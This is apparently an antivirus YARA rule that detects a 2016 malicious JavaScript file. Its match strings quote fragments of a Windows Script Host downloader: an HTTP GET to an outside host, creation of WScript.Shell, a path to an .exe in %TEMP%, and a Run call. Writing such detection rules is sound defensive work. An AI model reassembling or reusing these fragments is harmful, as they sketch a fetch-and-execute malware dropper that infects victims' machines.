rule sig_20160330_90f06614bdc050f4eb08933ddfd012d0 {
  meta:
    description = "datamaliciousorder - file 20160330_90f06614bdc050f4eb08933ddfd012d0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f445cb048a23f5d98a52089b9c2e8fb7f8672a7918f944a05857553bd85b1879"

  strings:
    $s1  = "JS[ZR](\"GET\", \"http://be-stlines-tore.com/k3soa\", false);" fullword ascii
    $s2  = "var X0 = function HF() {return WScript[Q0](\"WScript\"+\".Shell\");}(), HC = 11;" fullword ascii
    $s3  = "function A(E, JW){K = K * 1; return E - JW;};" fullword ascii
    $s4  = "if (JS[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Q(){return CD + \"\";};" fullword ascii
    $s6  = "function W() {return X0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ile4Mxhj.ex\" + \"e\";};" fullword ascii
    $s7  = "function YF(NI){X0[\"Run\"](NI, K, K);};" fullword ascii
    $s8  = "function T() {return ((PG == true) && (PG == RL)) ? 1 : K;};" fullword ascii
    $s9  = "function O(){return 22;};" fullword ascii
    $s10 = "function FB()" fullword ascii
    $s11 = "function ZL(){return Q0;};" fullword ascii
    $s12 = "}while (RM);" fullword ascii
    $s13 = "var UN = new this[\"Date\"]();" fullword ascii
    $s14 = "return A(CN, UZ);" fullword ascii
    $s15 = "function YV(US) {var S = (1, 2, 3, 4, 5, US); return S;};" fullword ascii
    $s16 = "var J = false;" fullword ascii
    $s17 = "var RL = false;" fullword ascii
    $s18 = "PG = true; " fullword ascii
    $s19 = "var PG = false;" fullword ascii
    $s20 = "RL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}